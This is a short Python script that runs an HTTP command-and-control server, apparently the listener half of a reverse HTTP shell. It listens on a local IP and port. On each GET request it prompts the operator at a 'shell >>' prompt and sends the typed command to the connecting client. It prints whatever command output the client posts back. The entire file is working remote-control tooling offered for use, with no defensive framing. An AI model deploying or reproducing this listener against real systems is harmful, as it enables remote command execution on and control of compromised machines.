#!/usr/bin/env python3 

from http.server import HTTPServer, BaseHTTPRequestHandler

PORT = 8000
SERVER_IPADDR = "192.168.1.205"

class MyGetRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type","text/html")
        self.end_headers()

        command = input("shell >>  ")
        self.wfile.write(command.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers["Content-length"])
        postVar = self.rfile.read(length)
        print(postVar.decode())

def web_server():
    print("Listing on {}:{} \n".format(SERVER_IPADDR, PORT))
    server = HTTPServer
    httpd = server((SERVER_IPADDR,PORT),MyGetRequestHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()

if __name__ == "__main__":
    web_server()